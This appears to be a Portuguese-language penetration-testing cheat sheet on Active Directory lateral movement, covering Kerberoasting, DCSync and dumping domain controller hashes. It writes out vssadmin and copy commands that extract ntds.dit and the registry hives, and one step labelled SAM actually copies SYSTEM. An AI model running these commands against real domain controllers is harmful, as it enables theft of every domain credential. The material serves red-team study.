
## Lateral Moviment
> ___


### Creds das Service Accounts (Kerberoasting)
> ___

E se você se encontrar em um cenário em que você é um usuário limitado, não consegue extrair senhas da memória e não teve sorte com as senhas no sistema host...

O que é Kerberoast?

permite que qualquer usuário de domínio solicite tickets TGS ao Kerberos que são criptografados com hash NTLM da senha plaintext de uma conta de usuário de domínio usada como conta de service e quebre-os offline, evitando bloqueios de conta do AD.

- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
- https://www.thehacker.recipes/ad/movement/kerberos/kerberoast


### Dump dos hash do Domain Controller (Shadow Copy ou Raw Copy)
> ___


Depois de obter acesso administrativo ao domain, a maneira antiga de extrair todos os hashes do DC era executar comandos no DC e usar técnicas de Shadow Volume ou Raw Copy para extrair o arquivo Ntds.dit. Isso pode ser feito de algumas formas:

#### 1 - 

```vssadmin create shadow /for=C:```

#Copy SAM
```copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM C:\Extracted\SAM```

#Copy SYSTEM
```copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM C:\Extracted\SYSTEM```

#Copy ntds.dit
```copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit C:\Extracted\ntds.dit```

```reg SAVE HKLM\SYSTEM c:\SYS```
#Delete created vol
```vssadmin delete shadows /for= [/oldest | all | shadow=]```

#### 2 - 

NinjaCopy tool, uma vez como Domain Controller, pode ser usado para pegar o arquivo Ntds.dit:

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1



### DCSync
> ___

Mais recentemente, o DCSync foi introduzido e mudou o jogo no despejo de hashes de Domain Controller. O conceito do DCSync é que ele se passa por um Domain Controller para solicitar todos os hashes dos usuários daquele domínio. Isso significa que, desde que você tenha permissões, não será necessário executar nenhum comando no DC e não será necessário descartar nenhum arquivo no DC. Para que o DCSync funcione, é importante ter as permissões adequadas para extrair hashes de um DC. Geralmente limitado aos ```Domain Admins```, ```Enterprise Admins```, ```Domain Controllers groups``` e qualquer pessoa com permissões de ```Replicating Changes``` definidas como ```Allow``` (ou seja, ```Replicating Changes All```/```Replicating Directory Changes```), o DCSync permitirá que seu usuário execute este ataque.

Existem algumas formas de fazer, aqui tem exemplos:

- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync

- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync
